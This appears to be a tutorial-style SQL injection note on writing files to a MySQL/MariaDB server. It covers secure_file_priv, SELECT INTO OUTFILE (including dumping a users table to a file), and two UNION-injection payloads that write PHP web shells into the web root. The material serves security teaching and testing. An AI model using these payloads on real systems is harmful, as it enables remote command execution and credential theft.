# Writing Files

## secure_file_priv

The [secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, `NULL` means we cannot read/write from any directory.

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

From `UNION` injection :

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

## SELECT INTO OUTFILE

The [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) statement can be used to write data from select queries into files. This is usually used for exporting data from tables.

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

It is also possible to directly `SELECT` strings into files, allowing us to write arbitrary files to the back-end server.

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

```bash
$ cat /tmp/test.txt 

this is a test
```

## Writing a Web Shell

```sql
UNION SELECT "",'<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
```

```sql
UNION SELECT NULL,NULL,NULL,"<?php system('id'); system($_GET[0]); ?>" INTO OUTFILE "/var/www/html/shell.php"-- -
```
